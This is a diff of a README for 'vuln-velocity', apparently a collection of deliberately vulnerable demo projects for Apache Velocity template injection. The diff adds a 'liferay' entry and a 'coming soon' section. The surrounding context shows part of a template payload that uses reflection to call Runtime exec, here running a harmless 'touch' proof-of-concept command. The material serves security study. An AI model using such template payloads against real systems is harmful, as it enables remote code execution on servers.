@@ -1,11 +1,14 @@
-# vuln-velocity projects:
+# vuln-velocity #
 
 What is Apache Velocity?
 Velocity is a Java-based template engine. It permits anyone to use a simple yet powerful template language to reference objects defined in Java code.
 
 Apache velocity can be used or configured wrong. Attacker can execute arbitrary code using apache velocity.
 
+## vuln velocity project: ##
+
 1. vuln-velocity-wicket
+2. vuln-velocity-liferay
 
 ## vuln-velocity-wicket ##
 
@@ -36,3 +39,6 @@ $classLoaderMethod.setAccessible(true)
 $runtimedMethodExecuted.getClass().getDeclaredMethod("exec", $stringClass).invoke($runtimedMethodExecuted, "touch /tmp/velocity-rce-poc.txt")
 ```
 
+## vuln-velocity-lifery ##
+
+Coming soon
